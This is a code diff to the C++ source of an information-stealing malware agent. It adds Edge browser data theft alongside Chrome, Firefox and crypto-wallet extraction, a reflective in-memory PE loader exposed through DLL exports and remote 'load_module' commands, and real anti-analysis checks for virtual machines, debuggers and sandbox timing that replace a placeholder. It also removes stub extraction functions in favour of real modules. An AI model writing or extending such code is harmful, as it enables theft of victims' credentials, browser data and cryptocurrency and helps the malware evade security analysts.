@@ -15,6 +15,7 @@ extern "C" {
     void InitLogger();
     void LogInfo(const char* message);
     void LogError(const char* message);
+    void LogWarning(const char* message);
     void LogDebug(const char* message);
     void CleanupLogger();
     
@@ -35,8 +36,16 @@ extern "C" {
     
     const char* ExtractChromeData();   // Chrome data extraction
     const char* ExtractFirefoxData();  // Firefox data extraction
+    const char* ExtractEdgeData();     // Edge data extraction
     const char* ExtractCryptoData();   // Crypto wallet extraction
     bool StartHVNC();                  // Start Hidden VNC
+    
+    // In-memory loader functions
+    bool LoadPEFromMemory(const void* data, size_t size);
+    void* GetLoadedPEEntryPoint();
+    void* GetLoadedPEExport(const char* functionName);
+    void UnloadPE();
+    bool ExecuteLoadedPE();
 }
 
 // Configuration
@@ -161,7 +170,7 @@ private:
         try {
             const char* chromeData = ExtractChromeData();
             if (chromeData && strlen(chromeData) > 0) {
-                AddEncryptedLog("browser", chromeData);
+                AddEncryptedLog("browser_chrome", chromeData);
                 LogInfo("Chrome data collected");
             }
         } catch (...) {
@@ -172,11 +181,22 @@ private:
         try {
             const char* firefoxData = ExtractFirefoxData();
             if (firefoxData && strlen(firefoxData) > 0) {
-                AddEncryptedLog("browser", firefoxData);
+                AddEncryptedLog("browser_firefox", firefoxData);
                 LogInfo("Firefox data collected");
             }
         } catch (...) {
             LogError("Failed to collect Firefox data");
+        }
+        
+        // Edge
+        try {
+            const char* edgeData = ExtractEdgeData();
+            if (edgeData && strlen(edgeData) > 0) {
+                AddEncryptedLog("browser_edge", edgeData);
+                LogInfo("Edge data collected");
+            }
+        } catch (...) {
+            LogError("Failed to collect Edge data");
         }
     }
     
@@ -305,6 +325,21 @@ private:
             bool success = InstallAdvancedPersistence();
             SendResponse(success ? "Reinstall successful" : "Reinstall failed");
         }
+        else if (command == "load_module") {
+            // Load and execute additional module from memory
+            std::vector<uint8_t> moduleData = DecryptModuleData(encryptedModule);
+            bool success = LoadPEFromMemory(moduleData.data(), moduleData.size());
+            if (success) {
+                bool executed = ExecuteLoadedPE();
+                SendResponse(executed ? "Module loaded and executed" : "Module loaded but execution failed");
+            } else {
+                SendResponse("Failed to load module");
+            }
+        }
+        else if (command == "unload_module") {
+            UnloadPE();
+            SendResponse("Module unloaded");
+        }
         */
     }
     
@@ -330,15 +365,67 @@ private:
 // Global agent instance
 std::unique_ptr<Agent> g_agent;
 
-// Anti-analysis checks (stub implementation)
+// Anti-analysis checks (implemented in stealth modules)
 bool CheckEnvironment() {
-    // This would typically check for:
-    // - Virtual machines (VMware, VirtualBox, etc.)
-    // - Debuggers
-    // - Sandboxes
-    // - Analysis tools
+    extern bool CheckForDebugger();
+    extern void ApplyAntiDebugProtection();
     
-    return true; // Placeholder - always pass
+    LogInfo("Starting comprehensive environment analysis...");
+    
+    // First, declare external functions
+    bool CheckVMEnvironment();
+    
+    bool vmDetected = false;
+    bool debuggerDetected = false;
+    
+    try {
+        // Check for virtual machine environment
+        vmDetected = !CheckVMEnvironment(); // CheckVMEnvironment returns true if clean
+        if (vmDetected) {
+            LogError("Virtual machine environment detected");
+        } else {
+            LogInfo("VM check passed");
+        }
+        
+        // Check for debugger presence
+        debuggerDetected = CheckForDebugger();
+        if (debuggerDetected) {
+            LogError("Debugger presence detected");
+            ApplyAntiDebugProtection();
+        } else {
+            LogInfo("Debugger check passed");
+        }
+        
+    } catch (...) {
+        LogError("Exception during environment checks");
+        return false; // Assume hostile environment on exception
+    }
+    
+    // Additional timing-based detection
+    LARGE_INTEGER freq, start, end;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&start);
+    
+    // Small delay to measure timing anomalies
+    Sleep(100);
+    
+    QueryPerformanceCounter(&end);
+    double elapsed = ((double)(end.QuadPart - start.QuadPart) * 1000.0) / freq.QuadPart;
+    
+    // Sleep(100) should take close to 100ms on real hardware
+    if (elapsed > 200.0 || elapsed < 50.0) {
+        LogWarning("Timing anomaly detected - possible analysis environment");
+        vmDetected = true;
+    }
+    
+    // Overall assessment
+    if (vmDetected || debuggerDetected) {
+        LogError("Environment check FAILED - analysis environment detected");
+        return false;
+    }
+    
+    LogInfo("Environment check PASSED - clean environment");
+    return true;
 }
 
 // Advanced persistence functions are implemented in advanced_persistence.cpp
@@ -348,18 +435,7 @@ bool InstallPersistence() {
     return InstallAdvancedPersistence();
 }
 
-// Module stubs (to be implemented in separate files)
-const char* ExtractChromeData() {
-    return "{\"browser\":\"chrome\",\"items\":[]}"; // Placeholder
-}
-
-const char* ExtractFirefoxData() {
-    return "{\"browser\":\"firefox\",\"items\":[]}"; // Placeholder
-}
-
-const char* ExtractCryptoData() {
-    return "{\"wallets\":[]}"; // Placeholder
-}
+// Real extraction functions are implemented in browser and crypto modules
 
 bool StartHVNC() {
     return false; // Not implemented
@@ -431,6 +507,27 @@ extern "C" __declspec(dllexport) BOOL ReinstallPersistence() {
     
     // Install fresh persistence
     return InstallAdvancedPersistence() ? TRUE : FALSE;
+}
+
+// In-memory loader exports
+extern "C" __declspec(dllexport) BOOL LoadModuleFromMemory(const void* data, DWORD size) {
+    return LoadPEFromMemory(data, size) ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) void* GetModuleEntryPoint() {
+    return GetLoadedPEEntryPoint();
+}
+
+extern "C" __declspec(dllexport) void* GetModuleExport(const char* functionName) {
+    return GetLoadedPEExport(functionName);
+}
+
+extern "C" __declspec(dllexport) BOOL ExecuteLoadedModule() {
+    return ExecuteLoadedPE() ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) void UnloadModule() {
+    UnloadPE();
 }
 
 // Alternative entry point for EXE
